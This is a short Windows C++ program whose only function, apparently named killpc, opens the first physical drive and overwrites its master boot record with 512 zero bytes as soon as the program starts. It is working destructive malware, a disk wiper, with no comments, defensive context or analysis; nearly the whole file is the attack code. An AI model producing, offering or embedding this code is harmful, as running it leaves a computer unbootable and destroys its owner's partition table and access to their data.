#include <windows.h>
#include <iostream>

void killpc() {
    HANDLE hDisk = CreateFileW(
        L"\\\\.\\PhysicalDrive0",
        GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hDisk == INVALID_HANDLE_VALUE) {
        MessageBoxA(NULL, "Failed to open disk handle.", "Error", MB_OK | MB_ICONERROR);
        abort();
    }

    BYTE zeroMBR[512] = { 0 };
    DWORD bytesWritten;

    if (!WriteFile(hDisk, zeroMBR, 512, &bytesWritten, NULL)) {
        MessageBoxA(NULL, "Failed to write to disk.", "Error", MB_OK | MB_ICONERROR);
        abort();
    }

    CloseHandle(hDisk);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    killpc();
    return 0;
}
